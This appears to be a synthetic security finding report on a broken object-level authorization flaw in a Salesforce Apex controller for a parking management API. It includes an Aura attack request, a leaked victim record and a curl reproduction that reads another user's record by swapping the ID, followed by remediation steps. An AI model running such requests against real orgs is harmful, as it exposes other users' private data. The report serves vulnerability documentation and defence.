# Security Analysis Report
**System:** ParkIQ Management API (Salesforce-Integrated)
**Domain:** Parking / Smart City
**Example ID:** SF-0050
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant/cross-tenant access on `CustomObjectController.getRecord` — attacker reads any parking CustomRecord |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on CustomRecord Object (Pattern 1.5)

### Summary
The Apex controller `CustomObjectController` on ParkIQ Management API (`3690c3b3.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the CustomRecord object. Per §5.0 Pattern 1.5, multi-tenant isolation is broken — an attacker reads CustomRecord `001C3B3` belonging to another user by substituting `recordId`. In a parking / smart city context, CustomRecord records may represent parking permits, sensor configuration records, and vehicle operator PII.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.CustomObjectController.getRecord`
**Affected endpoint:** `POST https://3690c3b3.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://3690c3b3.lightning.force.com/aura
Authorization: Bearer 00D3690C3B3!AR3690c3b3...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D3690C3B3!AR3690c3b3...

message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN",
"params":{"recordId":"001C3B3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim CustomRecord Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001C3B3", "Name": "Victim CustomRecord Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-22-9665"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D3690C3B3!AR3690c3b3..."
curl -s -X POST "https://3690c3b3.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"001C3B3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-22-9665
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CustomObjectController { ... }`
2. `WHERE Id = :recordId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
